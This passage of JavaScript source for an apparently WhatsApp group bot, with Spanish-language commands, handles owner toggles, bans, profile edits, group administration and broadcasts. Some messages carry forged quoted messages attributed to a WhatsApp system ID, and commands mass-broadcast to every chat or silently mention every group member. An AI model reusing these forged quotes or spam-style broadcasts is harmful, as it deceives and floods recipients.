					if (isSimi) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_simi.push(from)
					fs.writeFileSync('./basededatos/json/chatbot.json', JSON.stringify(_simi))
					okply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_simi.splice(from, 1)
					fs.writeFileSync('./basededatos/json/chatbot.json', JSON.stringify(_simi))
					okply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 CHAT-BOT 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵃᶜᵗᶦᵛᵃ ᵘⁿ ᶜʰᵃᵗ⁻ᵇᵒᵗ ᵉⁿ ᵘⁿ ᵍʳᵘᵖᵒ ᵈᵉ ʷʰᵃᵗˢᵃᵖᵖ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break
			case 'banchat':
			case 'chatban':
			case 'banearchat': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (UwU === 'activado') {
					if (isBanChat) return reply(`El comando ${command} ya estuvo activo en este grupo`)
					_chatban.push(from)
					fs.writeFileSync('./basededatos/json/banchat.json', JSON.stringify(_chatban))
					godeply(`*${command} activado en el grupo* : ${groupName}`)
				} else if (UwU === 'desactivado') {
					_chatban.splice(from, 1)
					fs.writeFileSync('./basededatos/json/banchat.json', JSON.stringify(_chatban))
					godeply(`*${command} desactivado en el grupo* : ${groupName}`)
				} else if (!UwU) {
					enviarbuton(from, `「 BANEAR-CHAT 」`, `Info:\nᴱˢᵗᵉ ᶜᵒᵐᵃⁿᵈᵒ ᵇᵃⁿᵉᵃ ᵉˡ ᵍʳᵘᵖᵒ ᵃᶜᵗᵘᵃˡ ᵖᵃʳᵃ ᵉᵛᶦᵗᵃʳ ᵘˢᵃʳ ᵃˡ ᵇᵒᵗ`, [{
						buttonId: `${prefix + command} activado`,
						buttonText: {
							displayText: `< [ ACTIVAR [✓] ] >`,
						},
						type: 1,
					}, {
						buttonId: `${prefix + command} desactivado`,
						buttonText: {
							displayText: `< [ DESACTIVAR [X] ]>`,
						},
						type: 1,
					}, ])
				}
			}
			break

			//Comando para el dueño ⚡
			case 'modo1': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				enviarbuton(from, `[ MODO 1 ]`, `${cocreador} ✓`, [{
					buttonId: `${prefix}privado`,
					buttonText: {
						displayText: `PRIVADO 🔒`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}publico`,
					buttonText: {
						displayText: `PUBLICO 🔓`,
					},
					type: 1,
				}, ])
			}
			break
			case 'publico': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (NK_Tesla === false) return
				NK_Tesla = false
				godeply(`Modo publico activado, ahora todos los participantes podran usar al bot`)
			}
			break
			case 'privado': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (NK_Tesla === true) return
				NK_Tesla = true
				godeply(`Modo privado activado, ahora solo el dueño del bot podra usarlo`)
			}
			break
			case 'modo2': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				enviarbuton(from, `[ MODO 2 ]`, `${cocreador} ✓`, [{
					buttonId: `${prefix}sinlinea`,
					buttonText: {
						displayText: `SIN-LINEA 🚫`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}enlinea`,
					buttonText: {
						displayText: `EN-LINEA 🌐`,
					},
					type: 1,
				}, ])
			}
			break
			case 'enlinea': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (OnOffLine === false) return
				OnOffLine = false
				godeply(`Bot modo En-Linea, ahora todos los comandos estan disponibles`)
			}
			break
			case 'sinlinea': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (OnOffLine === true) return
				OnOffLine = true
				godeply(`Bot modo Sin-Linea, ahora solo algunos comandos estaran disponibles`)
			}
			break
			case 'antiprivado': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				enviarbuton(from, `[ ANTI-PRIVADO ]`, `${cocreador} ✓`, [{
					buttonId: `${prefix}siprivado`,
					buttonText: {
						displayText: `SI-PRIVADOS 📳`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}noprivado`,
					buttonText: {
						displayText: `NO-PRIVADOS 📴`,
					},
					type: 1,
				}, ])
			}
			break
			case 'siprivado': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (AntiPv === false) return
				AntiPv = false
				godeply(`Modo Anti-Privado desactivado`)
			}
			break
			case 'noprivado': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (AntiPv === true) return
				AntiPv = true
				godeply(`Modo Anti-Privado activado, ahora todo aquel que hable al bot por privado sera bloqueado`)
			}
			break
			case 'antidel':
			case 'antidelete': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				enviarbuton(from, `[ ANTI-ELIMINAR ]`, `${cocreador} ✓`, [{
					buttonId: `${prefix}deletno`,
					buttonText: {
						displayText: `RECUPERAR ♻️`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}deletsi`,
					buttonText: {
						displayText: `IGNORAR 📌`,
					},
					type: 1,
				}, ])
			}
			break
			case 'deletsi':
			case 'deletesi': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (antidel === true) return
				antidel = true
				reply(`Antidel desactivado, ahora los mensajes eliminados no seran devueltos`)
			}
			break
			case 'deletno':
			case 'deleteno': { //
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (antidel === false) return
				antidel = false
				reply(`Antidel activado, ahora los mensajes eliminados seran devueltos`)
			}
			break
			case 'leerchat':
			case 'leerchats':
			case 'autoleer': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				enviarbuton(from, `[ AUTOLEER-CHATS ]`, `${cocreador} ✓`, [{
					buttonId: `${prefix}leergps`,
					buttonText: {
						displayText: `LEER GRUPOS 👀`,
					},
					type: 1,
				}, {
					buttonId: `${prefix}leerpvs`,
					buttonText: {
						displayText: `LEER PRIVADOS 👁️`,
					},
					type: 1,
				}, ])
			}
			break
			case 'leergps': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				readGc = true
				reply(`*[ ! ] Se activo el modo de leer automáticamente todos los grupos-chat*`)
			}
			break
			case 'leerpvs': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				readPc = true
				reply(`*[ ! ] Se activo el modo de leer automáticamente todos los chat-privados*`)
			}
			break

			//
			case 'predit': { //Comando para cambiar el prefijo
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (args.length < 1) return reply(`*[ ! ] Escriba solo un simbolo o numero*`)
				if (args[0].length >= 2) return reply(`*[ ! ] Solo se acepta un digito para el prefijo [ ! ]*`)
				prefix = args[0]
				MyInfo.Prefijo = prefix
				fs.writeFileSync('./informacion.json', JSON.stringify(MyInfo, null, '\t'))
				godeply(`El prefijo fue alterado correctamente ✓\nPrefijo nuevo: " ${prefix} "`)
			}
			break
			case 'nombrebot': { //Comando para cambiar el nombre del bot
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (args.length < 1) return reply(`*[ ! ] Escriba un nombre o apodo*`)
				if (args[0].length >= 16) return reply(`*[ ! ] El nombre debe contener 15 caracteres como maximo [ ! ]*`)
				NameBot = args[0]
				MyInfo.NombreDelBot = NameBot
				fs.writeFileSync('./informacion.json', JSON.stringify(MyInfo, null, '\t'))
				godeply(`El nombre del bot fue alterado correctamente ✓\nNombre nuevo: " ${NameBot} "`)
			}
			break
			case 'mydueño':
			case 'midueño': { //Comando para cambiar el nombre de dueño
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (args.length < 1) return reply(`*[ ! ] Escriba su nombre o apodo*`)
				if (args[0].length >= 26) return reply(`*[ ! ] El nombre debe contener 25 caracteres como maximo [ ! ]*`)
				cocreador = args[0]
				MyInfo.CoCreador = cocreador
				fs.writeFileSync('./informacion.json', JSON.stringify(MyInfo, null, '\t'))
				godeply(`El nombre del dueño fue alterado correctamente ✓\nNombre nuevo: " ${cocreador} "`)
			}
			break
			case 'misredes': { //Comando para editar redes sociales
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (args.length < 1) return reply(`*[ ! ] Coloque o pegue sus redes sociales*`)
				if (args[0].length >= 301) return reply(`*[ ! ] El texto debe contener 300 caracteres como maximo [ ! ]*`)
				social = UwU
				MyInfo.TusRedesSociales = social
				fs.writeFileSync('./informacion.json', JSON.stringify(MyInfo, null, '\t'))
				godeply(`Se edito la informacion para redes sociales :\n\n${monospace}${social}${monospace}`)
			}
			break
			case 'editarlimite': { //Comando para editar el límite
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (args.length < 1) return reply(`*[ ! ] Escriba el límite que desee*\n_Limite actual para usar comandos :_ ${limitawal}`)
				if (isNaN(UwU)) return await reply(`*[ ! ] Solo se aceptan numeros*`)
				if (UwU < limitawal) return reply(`*[ ! ] No puede poner un valor mas bajo que* ${limitawal}*`)
				if (args[0].length >= 6) return reply(`*[ ! ] Solo se aceptan 5 caracteres como maximo [ ! ]*`)
				limitawal = UwU
				MyInfo.LimiteParaUsarComandos = limitawal
				fs.writeFileSync('./informacion.json', JSON.stringify(MyInfo, null, '\t'))
				godeply(`Limite cambiado por el valor de : ${limitawal}`)
			}
			break
			case 'perfilbot': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (!isQuotedImage) return reply(`Responda una imagen con el comando ${prefix + command}`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let qumage = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let resimage = await teslagod.downloadMediaMessage(qumage)
				await teslagod.updateProfilePicture(botNumber, resimage)
				teslagod.sendMessage(from, resimage, image, {
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `📲 Perfil anterior : `,
								'jpegThumbnail': bothumb
							}
						}
					},
					caption: `Se cambio el perfil del bot con éxito\nFecha: ${fechaCompleta}`,
					sendEphemeral: true
				})
			}
			break
			//
			case 'suprimir': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (!isQuotedMsg) return reply(`*[ ! ] Esta accion solo puede usarse respondiendo un mensaje reciente del bot*`)
				teslagod.deleteMessage(from, {
					id: mek.message.extendedTextMessage.contextInfo.stanzaId,
					remoteJid: from,
					fromMe: true
				})
			}
			break
			case 'bcgc': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)

				let gmap = teslagod.chats.all().filter(v => v.jid.endsWith('g.us') && !v.read_only && v.message && !v.announce).map(v => v)
				reply(`Enviando transmisión a ${gmap.length} grupos, Finalizando en ${gmap.length * 1.5} segundos`)

				if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					buff = await teslagod.downloadMediaMessage(encmedia)
					for (let _ of gmap) {
						teslagod.sendMessage(_.jid, buff, image, {
							caption: `${UwU}`,
							thumbnail: userthumb,
							sendEphemeral: true
						})
					}
					godeply(`Mensaje transmitido a ${gmap.length} grupos ✓`)
				} else {
					for (let _ of gmap) {
						teslagod.sendMessage(_.jid, `${UwU}`, MessageType.text, {
							sendEphemeral: true,
							contextInfo: {
								externalAdReply: {
									title: `[📡TRANSMISIÓN 🛰️]`,
									"body": `${NameBot}`,
									"previewType": "PHOTO",
									"thumbnail": mythumb,
									"sourceUrl": `${reddom}`
								}
							}
						})
					}
					godeply(`Mensaje transmitido a ${gmap.length} grupos ✓`)
				}
			}
			break
			case 'bc': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)

				let textbc = `${UwU ? UwU : NameBot}`
				let gmap = teslagod.chats.all()

				if ((isMedia && quoted.mtype === 'imageMessage') && textbc) {
					let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					let buff = await teslagod.downloadMediaMessage(encmedia)
					reply(`Transmitiendo mensaje en ${gmap.length} chats\nFinalizando en ${gmap.length * 1.5} segundos`)

					for (let _ of gmap) {
						teslagod.sendMessage(_.jid, buff, image, {
							quoted: {
								key: {
									participant: `0@s.whatsapp.net`,
									...(from ? {
										remoteJid: "51995386439-1613049930@g.us"
									} : {})
								},
								message: {
									"videoMessage": {
										"title": `${textbc}`,
										"h": `UwU`,
										'seconds': '359996400',
										'gifPlayback': 'true',
										'caption': `${textbc}`,
										'jpegThumbnail': mythumb
									}
								}
							},
							caption: `${textbc}`,
							thumbnail: mythumb,
							sendEphemeral: true
						})
					}

				} else if ((isMedia && quoted.mtype === 'videoMessage') && textbc) {
					let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					let buff = await teslagod.downloadMediaMessage(encmedia)
					reply(`Transmitiendo mensaje en ${gmap.length} chats\nFinalizando en ${gmap.length * 1.5} segundos`)

					for (let _ of gmap) {
						teslagod.sendMessage(_.jid, buff, video, {
							sendEphemeral: true,
							mimetype: 'video/mp4',
							caption: `${textbc}`,
							quoted: {
								key: {
									fromMe: false,
									participant: `0@s.whatsapp.net`,
									...(from ? {
										remoteJid: "51995386439-1613049930@g.us"
									} : {})
								},
								message: {
									"videoMessage": {
										"title": `${textbc}`,
										"h": `UwU`,
										'seconds': '359996400',
										'caption': `${NameBot}`,
										'jpegThumbnail': mythumb
									}
								}
							}
						})
					}

				} else if ((isMedia && quoted.mtype === 'audioMessage') && textbc) {
					let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					let buff = await teslagod.downloadMediaMessage(encmedia)
					reply(`Transmitiendo mensaje en ${gmap.length} chats\nFinalizando en ${gmap.length * 1.5} segundos`)

					for (let _ of gmap) {
						teslagod.sendMessage(_.jid, buff, audio, {
							sendEphemeral: true,
							mimetype: 'audio/mp4',
							duration: 359996400,
							ptt: true,
							quoted: fvn,
							contextInfo: {
								"externalAdReply": {
									"title": `${textbc}`,
									mediaType: 2,
									"thumbnail": mythumb,
									"previewType": "VIDEO",
									"mediaUrl": `https://youtu.be/-BnJigQ4-cM`
								}
							},
						})
					}

				} else if ((isMedia && quoted.mtype === 'stickerMessage') && textbc) {
					let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					let buff = await teslagod.downloadMediaMessage(encmedia)
					reply(`Transmitiendo mensaje en ${gmap.length} chats\nFinalizando en ${gmap.length * 1.5} segundos`)

					for (let _ of gmap) {
						teslagod.sendMessage(_.jid, buff, sticker, {
							sendEphemeral: true,
							contextInfo: {
								externalAdReply: {
									title: textbc,
									body: `${NameBot}`,
									sourceUrl: reddom,
									thumbnail: mythumb
								}
							}
						})
					}
					godeply(`Mensaje simultaneo compartido a ${gmap.length} chats con exito :D`)

				} else {
					reply(`Por favor responda un archivo multimedia, como Imagen/Sticker/Audio/Video\nCon el comando: ${prefix + command}`)
				}

			}
			break
			case 'banear': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				let userme = mek.mentionedJid[0] ? mek.mentionedJid[0] : mek.quoted ? mek.quoted.sender : UwU.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				if (userme.match('51995386439')) return reply(`ª`)
				godeply(`Usuario baneado @${userme.slice(0, -15)} ahora ya no podra usar al bot ✓`)
				_ban.push(userme)
				fs.writeFileSync('./basededatos/json/baneados.json', JSON.stringify(_ban))
			}
			break
			case 'desbanear':
			case 'quitarbaneo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)
				let userme = mek.mentionedJid[0] ? mek.mentionedJid[0] : mek.quoted ? mek.quoted.sender : UwU.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
				godeply(`Usuario desbaneado @${userme.slice(0, -15)}`)
				_ban.splice(userme, 1)
				fs.writeFileSync('./basededatos/json/baneados.json', JSON.stringify(_ban))
			}
			break
			case 'totag':
			case 'hidetag':
			case '.': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!Matt_M && !autonomo && !isTeslaUser) return reply(`*[ ! ] Este comando solo puede ser usado por el dueño del bot*`)

				if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
					encmediau = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					file = await teslagod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
					value = args.join(" ")
					var group2 = await teslagod.groupMetadata(from)
					var member = group2['participants']
					var mem = []
					member.map(async adm => {
						mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
						contextInfo: {
							mentionedJid: mem
						},
						quoted: fakemek
					}
					ini_buffer = fs.readFileSync(file)
					teslagod.sendMessage(from, ini_buffer, sticker, options)
					fs.unlinkSync(file)
				} else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
					encmediau = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					file = await teslagod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
					value = args.join(" ")
					var group26 = await teslagod.groupMetadata(from)
					var member = group26['participants']
					var mem = []
					member.map(async adm => {
						mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
						contextInfo: {
							mentionedJid: mem
						},
						quoted: fakemek
					}
					ini_buffer = fs.readFileSync(file)
					teslagod.sendMessage(from, ini_buffer, image, options)
					fs.unlinkSync(file)
				} else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
					encmediau = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					file = await teslagod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
					value = args.join(" ")
					var group25 = await teslagod.groupMetadata(from)
					var member = group25['participants']
					var mem = []
					member.map(async adm => {
						mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
						mimetype: 'audio/mp4',
						duration: 9999999,
						ptt: true,
						contextInfo: {
							mentionedJid: mem
						},
						quoted: fakemek
					}
					ini_buffer = fs.readFileSync(file)
					teslagod.sendMessage(from, ini_buffer, audio, options)
					fs.unlinkSync(file)
				} else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
					encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					file = await teslagod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
					value = args.join(" ")
					var group24 = await teslagod.groupMetadata(from)
					var member = group24['participants']
					var mem = []
					member.map(async adm => {
						mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
						mimetype: 'video/gif',
						contextInfo: {
							mentionedJid: mem
						},
						quoted: fakemek
					}
					ini_buffer = fs.readFileSync(file)
					teslagod.sendMessage(from, ini_buffer, video, options)
					fs.unlinkSync(file)
				} else if ((isMedia && !mek.message.videoMessage || isQuotedDocument) && args.length == 0) {
					encmediau = isQuotedDocument ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					file = await teslagod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
					value = args.join(" ")
					var group23 = await teslagod.groupMetadata(from)
					var member = group23['participants']
					var mem = []
					member.map(async adm => {
						mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
						mimetype: 'text/plain',
						contextInfo: {
							mentionedJid: mem
						},
						quoted: fakemek
					}
					ini_buffer = fs.readFileSync(file)
					denz.sendMessage(from, ini_buffer, document, options)
					fs.unlinkSync(file)
				} else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
					encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					file = await teslagod.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
					value = args.join(" ")
					var group21 = await teslagod.groupMetadata(from)
					var member = group21['participants']
					var mem = []
					member.map(async adm => {
						mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
						mimetype: 'video/mp4',
						duration: 555555555,
						contextInfo: {
							mentionedJid: mem
						},
						quoted: fakemek
					}
					ini_buffer = fs.readFileSync(file)
					teslagod.sendMessage(from, ini_buffer, video, options)
					fs.unlinkSync(file)
				} else {
					var textos = `${UwU ? UwU : "ˢᵉˣʸ ᴱˡ ᑫᵘᵉ ᴸᵒ ᴸᵉᵃ ⁷ʷ⁷"}`
					var group = await teslagod.groupMetadata(from)
					var member = group["participants"]
					var mem = []
					member.map(async (adm) => {
						mem.push(adm.id.replace("c.us", "s.whatsapp.net"))
					})
					var hidetagbruh = {
						text: `${nwn}\n${textos}`,
						contextInfo: {
							mentionedJid: mem
						},
						quoted: fakemek,
					}
					teslagod.sendMessage(from, hidetagbruh, text)
				}

			}
			break
			case 'reiniciarlimite': {
				if (isBaneado) return
				if (!Matt_M && !autonomo && !isTeslaUser) return
				objetlimit = []
				await fs.writeFileSync('./basededatos/usuariosgod/limit.json', JSON.stringify(objetlimit))
				await reply(`Se reiniciaron los limites con exito ✓\nPara ver los cambios es necesario reiniciar el bot!`)
			}
			break

			//Acciones del bot en WhatsApp 
			//&
			//Comando para Administradores 
			case 'cgpen': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (args[1] == "segundos") {
					var timer = args[0] + "000"
				} else if (args[1] == "minutos") {
					var timer = args[0] + "0000"
				} else if (args[1] == "horas") {
					var timer = args[0] + "00000"
				} else {
					return reply(`*${pushname} en que tiempo desea cerrar el grupo?*\n\n_Ejemplo de uso_ : \n${prefix + command} 10 segundos`)
				}
				okply(`*El grupo se cerrará en ${UwU}*\n_Accion ejecutada por : ${pushname}_`)
				setTimeout(() => {
					teslagod.groupSettingChange(from, GroupSettingChange.messageSend, true)
					//teslagod.sendMessage(from, `*[ Se cerro el grupo con exito ✓ ]*`, MessageType.text, {sendEphemeral: true, quoted: fgclink })
				}, timer)
			}
			break
			case 'agp': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				teslagod.groupSettingChange(from, GroupSettingChange.messageSend, false)
				//teslagod.sendMessage(from, `*[ Grupo abierto ✓ ]*`, MessageType.text, {sendEphemeral: true, quoted: fgclink })
			}
			break
			case 'editnamegp':
			case 'esitgpname':
			case 'nombregp':
			case 'gpnombre':
			case 'gpname':
			case 'namegp': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				if (UwU.length >= 26) return reply(`*[ ! ] máximo de carácteres aceptados es 25*`)
				await teslagod.groupUpdateSubject(from, UwU)
				okply(`Se cambio el nombre del grupo con éxito ✓\nNombre nuevo : [ ${UwU} ]`)
			}
			break
			case 'editdesgp':
			case 'gpdesc':
			case 'descgp': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (!UwU) return reply(`*[ ! ] Y el texto?*`)
				if (UwU.length >= 513) return reply(`*[ ! ] Máximo de carácteres aceptados es 512*`)
				await teslagod.groupUpdateDescription(from, UwU)
				okply(`Se cambio la descripción del grupo con éxito ✓\nNueva descripción : ${nwn}\n${UwU}`)
			}
			break
			case 'fotogrupo':
			case 'perfilgrupo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				if (!quoted) return reply(`Responda una imagen con el comando ${prefix + command}`)
				if (!/image/.test(mime)) return reply(`Responda una imagen con el comando ${prefix + command}`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let encmedia = await isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				buff = await teslagod.downloadMediaMessage(encmedia)

				await teslagod.updateProfilePicture(from, buff)
				teslagod.sendMessage(from, `Se cambio el perfil del grupo con éxito`, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `Imagen anterior : `,
								'jpegThumbnail': gpthumb
							}
						}
					}
				})
			}
			break
			//
			case 'invocar':
			case 'todos':
			case 'tagall': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				if (!isGroupAdmins && !autonomo) return reply(`*[ ! ] Este comando solo puede ser usado por los administradores*`)
				let texto = `${UwU}`
				members_id = []
